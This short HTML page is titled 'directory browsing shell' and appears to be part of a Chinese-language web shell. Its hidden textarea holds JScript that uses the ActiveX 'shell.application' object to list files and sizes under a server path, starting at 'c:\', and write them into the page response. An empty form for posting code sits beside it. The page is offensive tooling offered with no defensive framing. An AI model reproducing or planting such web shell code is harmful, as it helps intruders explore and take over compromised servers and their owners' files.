<HTML >
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
<TITLE>目录浏览shell</TITLE>
<link rel="stylesheet" type="text/css" href="css.css">
</HEAD>
<BODY scroll="no" TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">

Input Path: <input style="WIDTH:90%" type="text"  value="c:\" />

<form name="codeform" method="post" action="" target=_blank>
<textarea name="code"></textarea>
</form>

<script></script>

<textarea style="display:none;"  name="js">
var shell=new ActiveXObject("shell.application");
function wjj(b){
try{
var c=new Enumerator(shell.namespace(b).Items());
for (;!c.atEnd();c.moveNext())
{
Response.write(c.item().Path+"----"+c.item().Size+"<BR>");
//if(!c.item().Size)wjj(c.item().path+"\\");
}

}catch(e){}
}

//wjj("c:\\");
</textarea>
</BODY></HTML>